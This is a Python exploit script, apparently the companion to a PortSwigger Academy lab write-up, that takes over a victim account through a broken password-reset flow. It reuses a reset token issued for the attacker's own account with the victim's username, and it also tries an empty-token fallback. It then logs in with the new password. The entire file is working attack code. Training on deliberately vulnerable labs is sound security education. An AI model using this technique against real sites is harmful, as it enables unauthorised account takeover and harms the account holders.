#!/usr/bin/env python3
"""
Password reset broken logic
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 12-password-reset-broken-logic.md

What this does:
    Requests a password reset for our own account (wiener) and retrieves the
    reset token from the lab's built-in email client. That token is genuinely
    valid -- but only for wiener. The script then submits it back to the reset
    endpoint with the username field swapped to the victim (carlos), proving the
    server never checks that the token it's validating actually belongs to the
    account it's resetting. As a secondary path (matching a fallback our original
    wrapper also tried), it submits with an empty token entirely for carlos, in
    case the primary path doesn't succeed on a given lab instance.

Usage:
    python 12-password-reset-broken-logic.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

VICTIM_USER = "carlos"
NEW_PASSWORD = "pwned123"


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _login(client: httpx.Client, lab_url: str, username: str, password: str) -> httpx.Response:
    page = client.get(f"{lab_url}/login")
    return client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": username, "password": password
    })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    page = client.get(f"{lab_url}/forgot-password")
    client.post(f"{lab_url}/forgot-password", data={
        "csrf": _csrf(page.text), "username": "wiener"
    })
    print("[*] Reset requested for wiener.")

    email_resp = client.get(f"{lab_url}/email")
    token_match = re.search(r"temp-forgot-password-token=([^&\"'<>\s]+)", email_resp.text)

    if token_match:
        token = token_match.group(1)
        print(f"[+] Reset token (issued for wiener): {token}")

        reset_page = client.get(f"{lab_url}/forgot-password?temp-forgot-password-token={token}")
        resp = client.post(f"{lab_url}/forgot-password?temp-forgot-password-token={token}", data={
            "csrf": _csrf(reset_page.text),
            "temp-forgot-password-token": token,
            "username": VICTIM_USER,
            "new-password-1": NEW_PASSWORD,
            "new-password-2": NEW_PASSWORD,
        })
        print(f"[*] Reset submitted with wiener's token but username={VICTIM_USER}: {resp.status_code}")

        _login(client, lab_url, VICTIM_USER, NEW_PASSWORD)
        check = client.get(lab_url)
        if "congratulations" in check.text.lower():
            print("[+] Lab solved -- token/username mismatch was never checked.")
            return
    else:
        print("[!] No reset token found in the email client -- trying the empty-token fallback.")

    # Fallback: submit with no token value at all.
    page = client.get(f"{lab_url}/forgot-password")
    client.post(f"{lab_url}/forgot-password", data={
        "csrf": _csrf(page.text),
        "username": VICTIM_USER,
        "temp-forgot-password-token": "",
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD,
    })
    _login(client, lab_url, VICTIM_USER, NEW_PASSWORD)

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
